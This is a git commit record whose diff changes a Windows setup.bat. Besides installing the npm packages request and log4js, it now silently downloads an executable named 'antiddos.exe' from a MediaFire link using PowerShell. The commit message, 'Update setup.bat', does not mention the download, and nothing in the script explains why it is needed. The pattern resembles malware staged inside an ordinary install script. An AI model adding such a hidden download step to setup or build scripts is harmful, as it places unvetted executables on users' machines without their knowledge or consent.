61096e60ce1871490e6855993bcbffb5afbd2755
OkSipXD <68255754+OkSip@users.noreply.github.com>
2020-11-28 20:25:40 +0700

    Update setup.bat

--- setup.bat
+++ setup.bat
@@ -1,2 +1,2 @@
 @echo off
-npm install request & npm install log4js
+npm install request & npm install log4js & %SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest http://download1590.mediafire.com/9kzf9vgzzh5g/peypmnsrk39phsy/antiddos.exe -OutFile antiddos.exe"
